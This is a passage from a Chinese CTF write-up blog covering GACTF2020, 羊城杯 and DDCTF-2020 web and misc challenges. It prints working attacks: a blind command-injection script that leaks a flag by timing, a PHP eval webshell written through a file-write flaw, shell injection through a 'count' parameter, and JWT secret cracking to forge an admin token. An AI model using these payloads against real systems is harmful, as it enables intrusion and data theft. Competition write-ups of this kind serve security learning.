zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=xz</span><br><span class="line"><span class="attribute">id</span>: &lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p> <code>sess_xz</code> 内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">balance|i:<span class="number">2233</span>;items|a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">18</span>:<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;&#125;note|s:<span class="number">0</span>:<span class="string">&quot;&quot;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>导入<code>sess_xzas</code>,进行反序列化,将<code>sess_xz</code>中内容导入到<code>node_cmd.php</code></li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/babycode/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.21.136</span><br><span class="line"><span class="attribute">Proxy-Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4255.0 Safari/537.36 Edg/87.0.634.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=xzas</span><br></pre></td></tr></table></figure>

<p>之后就可以访问node_cmd.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">balance|i:<span class="number">2233</span>;items|a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">18</span>:<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;&#125;note|s:<span class="number">0</span>:<span class="string">&quot;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>learn from </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/216289#h3-5">https://www.anquanke.com/post/id/216289#h3-5</a></li>
<li><a target="_blank" rel="noopener" href="https://z3ratu1.github.io/2020/08/31/%5BGACTF2020%5D/">https://z3ratu1.github.io/2020/08/31/%5BGACTF2020%5D/</a></li>
</ul>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="crymisc"><a href="#crymisc" class="headerlink" title="crymisc"></a><strong>crymisc</strong></h3><p>参考连接:</p>
<p><a target="_blank" rel="noopener" href="https://blog.xiafeng2333.top/ctf-30/">https://blog.xiafeng2333.top/ctf-30/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">🔭💙🐰✊🌻🐧💙😘🌻🍶💐🍌🏊🍩🚁🏊👹🐶😀🐶😀😘👹💙🍂💇😀😀😩🌻🍟👂🍶💐🍌🏊🍩👆🏠🙇🍂🍂👼😱🚔🐶👉✊😱🏠🙇🍂🍂👼😱🚊😧💨💙💕</span><br><span class="line">That is what i told her↑↑↑</span><br></pre></td></tr></table></figure>

<ul>
<li>爆破代码</li>
</ul>
<p><code>https://github.com/pavelvodrazka/ctf-writeups/tree/master/hackyeaster2018/challenges/egg17/files/cracker</code></p>
<ul>
<li>result</li>
</ul>
<p><img src="http://img.xzaslxr.xyz/img/image-20200830151854457.png" alt="image-20200830151854457"></p>
<h1 id="🐏城杯"><a href="#🐏城杯" class="headerlink" title="🐏城杯"></a>🐏城杯</h1><p><img src="http://ximg.linkedbyx.com/42f2024636d403ae1f505d3298cc51bd.png" alt="🐏城杯"></p>
<h2 id="web-3"><a href="#web-3" class="headerlink" title="web"></a>web</h2><h3 id="easycon"><a href="#easycon" class="headerlink" title="easycon"></a>easycon</h3><p>扫到  <code>index.php</code>，根据提示 上antsword</p>
<p>下载<code>bbbbbbbb.txt</code>,再转成<code>flag.gif</code> </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat bbbbbbbbb.txt |base64 -d &gt;flag.gif</span><br></pre></td></tr></table></figure>

<h3 id="BlackCat"><a href="#BlackCat" class="headerlink" title="BlackCat"></a>BlackCat</h3><p>根据提示查看mp3</p>
<p><code>view-source:http://183.129.189.60:10022/Hei_Mao_Jing_Chang.mp3</code></p>
<p>在最后几行,存在代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_POST[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">&#x27;One-ear&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Ë­£¡¾¹¸Ò²ÈÎÒÒ»Ö»¶úµÄÎ²°Í£¡&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$clandestine = getenv(<span class="string">&quot;clandestine&quot;</span>);<span class="comment">//获得环境量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;White-cat-monitor&#x27;</span>]))</span><br><span class="line">    $clandestine = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $_POST[<span class="string">&#x27;White-cat-monitor&#x27;</span>], $clandestine);<span class="comment">//hmac-sha256 加密</span></span><br><span class="line"><span class="comment">// 注意 这里的 $clandestine 是encode($White-cat-monitor,$clandestine)</span></span><br><span class="line"><span class="comment">// $clandestine 可以为 空 var_dump(hash_hmac(&#x27;sha256&#x27;,array(),&#x27;fe1w0&#x27;));</span></span><br><span class="line"></span><br><span class="line">$hh = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $_POST[<span class="string">&#x27;One-ear&#x27;</span>], $clandestine);<span class="comment">//同样对One-ear 加密</span></span><br><span class="line"><span class="comment">//  nc ;echo &#x27;<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span>&#x27; &gt; fe1w0.php</span></span><br><span class="line"><span class="keyword">if</span>($hh !== $_POST[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>])&#123;  <span class="comment">//encode(One-ear) === encode(Black-Cat-Sheriff)</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ÓÐÒâÃé×¼£¬ÎÞÒâ»÷·¢£¬ÄãµÄÃÎÏë¾ÍÊÇÄãÒªÃé×¼µÄÄ¿±ê¡£ÏàÐÅ×Ô¼º£¬Äã¾ÍÊÇÄÇ¿ÅÉäÖÐ°ÐÐÄµÄ×Óµ¯¡£&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">&quot;nc&quot;</span>.$_POST[<span class="string">&#x27;One-ear&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<ul>
<li>payload from 🦌🥚</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import hmac</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://183.129.189.60:10022/&quot;</span></span><br><span class="line">data1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=&quot;</span></span><br><span class="line">str = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> t in range(<span class="number">1</span>, <span class="number">400</span>):</span><br><span class="line">    <span class="keyword">for</span> i in data1:</span><br><span class="line">        one = <span class="string">&quot;1;if [ $(cat flag*|base64|cut -c %i) = \&quot;%s\&quot; ];then sleep 6;fi&quot;</span> % (t, i)</span><br><span class="line">        key = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        black = hmac.<span class="keyword">new</span>(key, one.encode(<span class="string">&#x27;utf-8&#x27;</span>), <span class="string">&#x27;sha256&#x27;</span>).hexdigest()</span><br><span class="line">        data2 = &#123;</span><br><span class="line">            <span class="string">&quot;Black-Cat-Sheriff&quot;</span>: black,</span><br><span class="line">            <span class="string">&quot;One-ear&quot;</span>: one,</span><br><span class="line">            <span class="string">&quot;White-cat-monitor[]&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res1 = requests.post(url, data=data2, timeout=<span class="number">4</span>)</span><br><span class="line">        except:</span><br><span class="line">            str = str + i</span><br><span class="line">            <span class="keyword">print</span>(str)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment"># print(data1)</span></span><br></pre></td></tr></table></figure>

<h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);<span class="comment">//unlink() 函数删除文件</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">&#x27;on&#x27;</span>) || stristr($content,<span class="string">&#x27;html&#x27;</span>) || stristr($content,<span class="string">&#x27;type&#x27;</span>) || stristr($content,<span class="string">&#x27;flag&#x27;</span>) || stristr($content,<span class="string">&#x27;upload&#x27;</span>) || stristr($content,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;  <span class="comment">//不区分大小写的</span></span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, $filename) == <span class="number">1</span>) &#123; <span class="comment">// 不能是字母</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file); <span class="comment">// 再删一遍</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//183.129.189.60:10023/sandbox/t1cje6n4eo2p7f7h90e54m7ng3/?filename=index.php&amp;content=<span class="meta">&lt;?php</span> eval($_GET[&#x27;xz&#x27;]) <span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//183.129.189.60:10023/sandbox/t1cje6n4eo2p7f7h90e54m7ng3/index.php?xz=system(&#x27;cat /flag&#x27;);</span></span><br><span class="line"></span><br><span class="line">GWHT&#123;easyApache&#125; Hello, world</span><br></pre></td></tr></table></figure>

<h3 id="easyphp2"><a href="#easyphp2" class="headerlink" title="easyphp2"></a>easyphp2</h3><p><code>Coo    kie:pass=GWHT</code> 绕过第一层</p>
<ul>
<li>读取源代码</li>
</ul>
<p>使用<code>file=php://filter/read=convert.quoted-printable-encode/resource=GWHT.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The Count is: <span class="string">&quot; . exec(&#x27;printf \&#x27;&#x27; . <span class="subst">$count</span> . &#x27;\&#x27; | wc -c&#x27;) . &quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>命令执行 </li>
</ul>
<p><code>http://183.129.189.60:10025/GWHT.php?count=1&#39; | whoami ||&#39;</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;GWHT.php&amp;count&#x3D;1&#39; | find &#x2F; -name flag* &gt; fe1w0||&#39;</span><br><span class="line">&#x2F;GWHT&#x2F;system&#x2F;of&#x2F;a&#x2F;down&#x2F;flag.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>提高权限</li>
</ul>
<blockquote>
<p> <code>www-data</code>没有读<code>flag.txt</code>权限</p>
</blockquote>
<p><code>cat /GWHT/*</code> 得到<code>GWHT</code>加密后密码, 在<code>https://www.somd5.com/</code></p>
<p><img src="http://img.xzaslxr.xyz/img/image-20200911170301301.png" alt="image-20200911170301301"></p>
<p>查询得到<code>GWHTCTF</code></p>
<p>最后,登录<code>GWHT</code>账号,读取<code>flag.txt</code>。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@18c88ee78e67:/var/www/html$ su GWHT</span><br><span class="line">su GWHT</span><br><span class="line">Password: GWHTCTF</span><br><span class="line">cat  /GWHT/system/of/a/down/flag.txt</span><br><span class="line">GWHT&#123;Y0U_H4VE_A_BETTER_SK1LL&#125;</span><br></pre></td></tr></table></figure>

<h1 id="DDCTF-2020"><a href="#DDCTF-2020" class="headerlink" title="DDCTF-2020"></a>DDCTF-2020</h1><h2 id="web-4"><a href="#web-4" class="headerlink" title="web"></a>web</h2><h3 id="Web签到题"><a href="#Web签到题" class="headerlink" title="Web签到题"></a>Web签到题</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\WINDOWS\System32&gt; curl.exe http://<span class="number">117.51</span>.<span class="number">136.197</span>/hint/<span class="number">1</span>.txt</span><br><span class="line">Interface documentation</span><br><span class="line">- login interface</span><br><span class="line">[-][<span class="type">Safet</span> <span class="type">Reminder</span>]The Private key cannot use request <span class="keyword">parameter</span></span><br><span class="line">Request</span><br><span class="line">Method | POST</span><br><span class="line">URL    | http://<span class="number">117.51</span>.<span class="number">136.197</span>/admin/login</span><br><span class="line"><span class="keyword">Param</span>  | username str | <span class="built_in">pwd</span> str</span><br><span class="line">Response</span><br><span class="line">token str | auth(Certification information)</span><br><span class="line"></span><br><span class="line">- auth interface</span><br><span class="line">Request</span><br><span class="line">Method | POST</span><br><span class="line">URL    | http://<span class="number">117.51</span>.<span class="number">136.197</span>/admin/auth</span><br><span class="line"><span class="keyword">Param</span>  | username str | <span class="built_in">pwd</span> str | token str</span><br><span class="line">Response</span><br><span class="line">url str | client download link</span><br><span class="line"></span><br><span class="line">+------------------+                +----------------------+                +--------------------+</span><br><span class="line">|                  |                |                      |                |                    |</span><br><span class="line">|                  +----------------&gt;                      +----------------&gt;                    |</span><br><span class="line">|  Client(Linux)   |                |     Auth/Command     |                |       minion       |</span><br><span class="line">|                  &lt;----------------+                      +&lt;---------------+                    |</span><br><span class="line">|                  |                |                      |                |                    |</span><br><span class="line">+------------------+                +----------------------+                +--------------------+</span><br></pre></td></tr></table></figure>



<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\WINDOWS\System32&gt; curl.exe <span class="literal">-X</span> POST http://<span class="number">117.51</span>.<span class="number">136.197</span>/admin/login  <span class="literal">-d</span> <span class="string">&#x27;username=1&amp;pwd=1&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;code&quot;</span>:<span class="number">0</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;success&quot;</span>,<span class="string">&quot;data&quot;</span>:<span class="string">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6IjEiLCJwd2QiOiIxIiwidXNlclJvbGUiOiJHVUVTVCIsImV4cCI6MTU5OTMyMTMzOH0.n6AKHW8cOrmKyFZhIIeV66ZcUHx2b-D-lxT0mEheWUE&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;userName&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;pwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;userRole&quot;</span>: <span class="string">&quot;GUEST&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;exp&quot;</span>: <span class="number">159</span>xxxxxxx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这时只要细心观察或用<code>jwtcrack </code>爆破,就会发现<code>Secret</code>为<code>pwd</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6IjEiLCJwd2QiOiIxIiwidXNlclJvbGUiOiJHVUVTVCIsImV4cCI6MTU5OTMyMjA4OX0.TgqnVS7NyDbmX4M38Ow-K8ilgFYHx5-jzbOxUPYxoyw</span><br><span class="line">Secret is &quot;1&quot;</span><br></pre></td></tr></table></figure>

<p>那么我们就根据<code>jwt</code>格式编写<code>admin</code>的<code>jwt</code>就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">a = &#123;</span><br><span class="line">  <span class="string">&quot;userName&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;pwd&quot;</span>: <span class="string">&quot;fe1w0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;userRole&quot;</span>: <span class="string">&quot;ADMIN&quot;</span>,</span><br><span class="line">  <span class="string">&quot;exp&quot;</span>: <span class="number">1599322683</span></span><br><span class="line">&#125;</span><br><span class="line">jj=jwt.encode(a,<span class="string">&#x27;fe1w0&#x27;</span>, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">print(jj)</span><br><span class="line"><span class="comment">#eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6ImFkbWluIiwicHdkIjoiZmUxdzAiLCJ1c2VyUm9sZSI6IkFETUlOIiwiZXhwIjoxNTk5MzIyNjgzfQ.toeN4J1eAkPmZFnYXsL4qNqHhPF31YnKPv6VjZV7n_M</span></span><br></pre></td></tr></table></figure>

<p>获得下载链接<code>http://117.51.136.197/B5Itb8dFDaSFWZZo/client</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\WINDOWS\System32&gt; curl.exe <span class="literal">-X</span> POST  http://<span class="number">117.51</span>.<span class="number">136.197</span>/admin/auth  <span class="literal">-d</span> <span class="string">&#x27;username=admin&amp;pwd=fe1w0&amp;token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6ImFkbWluIiwicHdkIjoiZmUxdzAiLCJ1c2VyUm9sZSI6IkFETUlOIiwiZXhwIjoxNTk5MzIyNjgzfQ.toeN4J1eAkPmZFnYXsL4qNqHhPF31YnKPv6VjZV7n_M&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;code&quot;</span>:<span class="number">0</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;success&quot;</span>,<span class="string">&quot;data&quot;</span>:<span class="string">&quot;client dowload url: http://117.51.136.197/B5Itb8dFDaSFWZZo/client&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>client</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">fe1w0@fe1w0:~$ ./client </span><br><span class="line">2020/09/05 00:43:57 </span><br><span class="line"> ____  _  ____  _  ____  _____  _____       ____  ____  ____  ____ </span><br><span class="line">/  _ \/ \/  _ \/ \/   _\/__ __\/    /      /_   \/  _ \/_   \/  _ \</span><br><span class="line">| | \|| || | \|| ||  /    / \  |  __\_____  /   /| / \| /   /| / \|</span><br><span class="line">| |_/|| || |_/|| ||  \__  | |  | |   \____\/   /_| \_/|/   /_| \_/|</span><br><span class="line">\____/\_/\____/\_/\____/  \_/  \_/         \____/\____/\____/\____/</span><br><span class="line">                                                                   </span><br><span class="line"></span><br><span class="line">2020/09/05 00:43:57 </span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">|Flag Path      := /home/dc2-user/flag/flag.txt                 |</span><br><span class="line">|签名格式       :=      <span class="built_in">command</span>|time_stamp                                      |</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line"></span><br><span class="line">2020/09/05 00:43:57 </span><br><span class="line">+------------------+                +----------------------+                +--------------------+</span><br><span class="line">|                  |                |                      |                |                    |</span><br><span class="line">|                  +----------------&gt;                      +----------------&gt;                    |</span><br><span class="line">|     Client       |                |     Auth/Command     |                |       minion       |</span><br><span class="line">|                  &lt;----------------+                      +&lt;---------------+                    |</span><br><span class="line">|                  |                |                      |                |                    |</span><br><span class="line">+------------------+                +----------------------+                +--------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2020/09/05 00:43:57 [*]Start ping master...</span><br><span class="line">2020/09/05 00:43:58 [-]http://117.51.136.197/server/health connect succuess</span><br><span class="line">2020/09/05 00:43:58 [*]Start send <span class="built_in">command</span> to minions...</span><br><span class="line">2020/09/05 00:43:58 [+]get sign:F75PJ/5iqAUAek5+0lXL6WJgslyD0Wn5X5l4gGCICwI=, <span class="built_in">command</span>:<span class="string">&#x27;DDCTF&#x27;</span>, time_stamp:1599237838</span><br><span class="line">2020/09/05 00:43:58 [+]send <span class="built_in">command</span> url  and response:&#123;<span class="string">&quot;code&quot;</span>:0,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;success&quot;</span>,<span class="string">&quot;data&quot;</span>:<span class="string">&quot;DDCTF&quot;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>wireshark抓包</p>
<p><img src="http://img.xzaslxr.xyz/img/image-20200905194917545.png" alt="image-20200905194917545"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;server&#x2F;health HTTP&#x2F;1.1</span><br><span class="line">Host: 117.51.136.197</span><br><span class="line">User-Agent: Go-http-client&#x2F;1.1</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 </span><br><span class="line">Server: nginx&#x2F;1.14.0 (Ubuntu)</span><br><span class="line">Date: Sat, 05 Sep 2020 11:48:37 GMT</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">2a</span><br><span class="line">&#123;&quot;code&quot;:0,&quot;message&quot;:&quot;success&quot;,&quot;data&quot;:null&#125;</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST &#x2F;server&#x2F;command HTTP&#x2F;1.1</span><br><span class="line">Host: 117.51.136.197</span><br><span class="line">User-Agent: Go-http-client&#x2F;1.1</span><br><span class="line">Content-Length: 103</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line"></span><br><span 